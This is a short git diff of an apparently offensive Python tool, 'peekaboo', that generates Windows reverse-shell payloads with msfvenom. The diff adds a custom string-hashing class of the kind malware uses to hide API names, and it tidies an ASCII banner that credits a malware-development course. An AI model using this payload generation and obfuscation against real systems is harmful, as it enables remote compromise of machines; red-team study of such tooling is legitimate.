@@ -50,6 +50,16 @@ class PeekabooEncryptor():
         length = random.randint(16, 32)
         return ''.join(random.choice(string.ascii_letters) for i in range(length))
 
+class PeekabooHash():
+    def __init__(self):
+        self.hash = 0x35
+
+    def hashing(self, data):
+        for i in range(0, len(data)):
+            self.hash += ord(data[i]) + (self.hash << 1)
+        print (self.hash)
+        return self.hash
+
 def generate_payload(host, port):
     print (Colors.BLUE + "generate reverse shell payload..." + Colors.ENDC)
     msfv = "msfvenom -p windows/x64/shell_reverse_tcp"
@@ -68,12 +78,12 @@ def generate_payload(host, port):
 
 def run_peekaboo(host, port):
     banner = """
-    #####  ###### #    #         ##         #####   ####   ####  
-    #    # #      #   #         #  #        #    # #    # #    # 
-    #    # #####  ####   ##### #    # ##### #####  #    # #    # 
-    #####  #      #  #         ######       #    # #    # #    # 
-    #      #      #   #        #    #       #    # #    # #    # 
-    #      ###### #    #       #    #       #####   ####   ####  
+    #####  ###### #    #         ##         #####   ####   ####
+    #    # #      #   #         #  #        #    # #    # #    #
+    #    # #####  ####   ##### #    # ##### #####  #    # #    #
+    #####  #      #  #         ######       #    # #    # #    #
+    #      #      #   #        #    #       #    # #    # #    #
+    #      ###### #    #       #    #       #####   ####   ####
     by @cocomelonc, many thanks to:
     https://institute.sektor7.net/red-team-operator-malware-development-essentials
     """
